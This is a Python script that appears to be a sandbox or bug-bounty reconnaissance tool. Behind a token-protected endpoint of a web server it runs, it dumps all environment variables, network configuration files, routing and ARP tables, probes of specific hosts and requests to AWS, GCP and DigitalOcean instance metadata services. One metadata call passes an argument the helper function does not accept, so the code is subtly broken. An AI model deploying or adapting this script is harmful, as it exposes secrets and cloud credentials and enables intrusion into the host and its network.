import json, os, socket, threading, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "r7xQ2kT9mV4bZ8wP"

def tcp(target, port, timeout=5):
    try:
        s = socket.create_connection((target, port), timeout=timeout)
        s.settimeout(3)
        try:
            data = s.recv(64)
            first = data.hex() if data else "connect-ok-no-data"
        except Exception as e:
            first = "connect-ok-read:" + type(e).__name__
        s.close()
        return {"tcp": "ok", "first_bytes": first}
    except Exception as e:
        return {"tcp": type(e).__name__ + ": " + str(e)}

def http(url, headers=None, method="GET", timeout=5):
    try:
        req = urllib.request.Request(url, headers=headers or {}, method=method)
        r = urllib.request.urlopen(req, timeout=timeout)
        return {"status": r.status, "body": r.read(400).decode("utf-8", "replace")}
    except Exception as e:
        rd = getattr(e, "read", None)
        body = rd.read(400).decode("utf-8", "replace") if rd else ""
        return {"error": type(e).__name__ + ": " + str(e), "body": body}

def dns(name):
    try:
        return socket.gethostbyname(name)
    except Exception as e:
        return type(e).__name__ + ": " + str(e)

def run_all():
    o = {}
    o["env"] = dict(os.environ)
    o["hostname"] = socket.gethostname()
    o["resolv_conf"] = _safe("/etc/resolv.conf")
    o["route"] = _safe("/proc/net/route")
    o["arp"] = _safe("/proc/net/arp")
    o["dns_falcon"] = dns("falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com")
    o["dns_own_pg"] = dns("pg-reaudit1-test12345323456-ae5b.l.aivencloud.com")
    o["tcp_falcon_33046"] = tcp("129.213.46.149", 33046)
    o["tcp_own_pg_26247"] = tcp("pg-reaudit1-test12345323456-ae5b.l.aivencloud.com", 26247)
    o["http_imds_generic"] = http("http://169.254.169.254/", redirect=False)
    o["http_imds_aws_token"] = http("http://169.254.169.254/latest/api/token",
        {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, method="PUT")
    o["http_gcp_metadata"] = http("http://metadata.google.internal/computeMetadata/v1/",
        {"Metadata-Flavor": "Google"})
    o["http_do_metadata"] = http("http://169.254.169.254/metadata/v1.json")
    return o

def _safe(p):
    try:
        return open(p).read()[:1200]
    except Exception as e:
        return type(e).__name__ + ": " + str(e)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" + TOKEN:
            body = json.dumps(run_all(), default=str).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", 8000), H).serve_forever()
